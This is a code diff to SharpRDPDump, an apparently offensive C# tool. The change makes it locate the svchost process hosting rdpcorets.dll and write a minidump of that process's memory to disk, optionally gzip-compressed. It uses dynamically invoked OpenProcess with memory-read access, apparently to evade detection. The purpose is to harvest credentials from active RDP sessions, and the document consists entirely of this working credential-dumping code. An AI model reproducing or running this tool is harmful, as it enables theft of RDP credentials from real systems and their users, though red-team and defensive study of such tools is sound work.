@@ -79,6 +79,28 @@ namespace SharpRDPDump
             }
         }
 
+        public static uint getrdpcoretsprocID()
+        {
+            Process[] proclist = Process.GetProcessesByName("svchost");
+
+            foreach (Process proc in proclist)
+            {
+                try
+                {
+                    foreach (ProcessModule module in proc.Modules)
+                    {
+                        if (module.ToString().Contains("rdpcorets.dll"))
+                        {
+                            return (uint)proc.Id;
+                        }
+                    }
+                }
+                catch { }
+            }
+
+            return 0;
+        }
+
         public static void Minidump(string dumpFile, bool compress)
         {
             if (string.IsNullOrEmpty(dumpFile))
@@ -86,12 +108,13 @@ namespace SharpRDPDump
                 throw new Exception("you need to specify a location to write the dump to.");
             }
 
-            uint targetProcessId = (uint)Process.GetProcessesByName("mstsc")[0].Id;
+            /*  uint targetProcessId = (uint)Process.GetProcessesByName("mstsc")[0].Id;*/
+            uint targetProcessId = getrdpcoretsprocID();
             if (targetProcessId == 0)
             {
-                throw new Exception("mstsc.exe does not seem to be running.");
+                throw new Exception("rdpcorets not found are you sure you have an RDP session open?.");
             }
-            Console.WriteLine("mstsc found! dumping PID:" + targetProcessId);
+            Console.WriteLine("rdpcorets found! dumping PID:" + targetProcessId);
             object[] openProcParams = { DInvoke.Data.Win32.Kernel32.ProcessAccessFlags.PROCESS_QUERY_INFORMATION | DInvoke.Data.Win32.Kernel32.ProcessAccessFlags.PROCESS_VM_READ, false, targetProcessId };
             IntPtr targetProcessHandle = (IntPtr)Generic.DynamicAPIInvoke("kernel32.dll", "OpenProcess", typeof(Win32.Delegates.OpenProcess), ref openProcParams);
             bool bRet = false;
@@ -125,8 +148,12 @@ namespace SharpRDPDump
                 Console.WriteLine(String.Format("[X] Dump failed: {0}", bRet));
             }
         }
+
+
         static void Main(string[] args)
         {
+
+
             bool compress = false;
             bool help = false;
             string dumpLocation = Environment.GetEnvironmentVariable("LocalAppData") + @"\rdpdump.bin";
@@ -138,7 +165,7 @@ namespace SharpRDPDump
                 {"c|compress","compressess the minidump and deletes the normal dump from disk (gzip format)",o => compress = true }
             };
 
-            //   try
+            try
             {
                 PrintBanner();
                 if (!Is64Bits())
@@ -161,10 +188,11 @@ namespace SharpRDPDump
                 }
                 Minidump(dumpLocation, compress);
             }
-            // catch (Exception ex)
+            catch (Exception ex)
             {
-                //   Console.WriteLine(ex.Message);
+                Console.WriteLine(ex.Message);
             }
         }
+
     }
 }
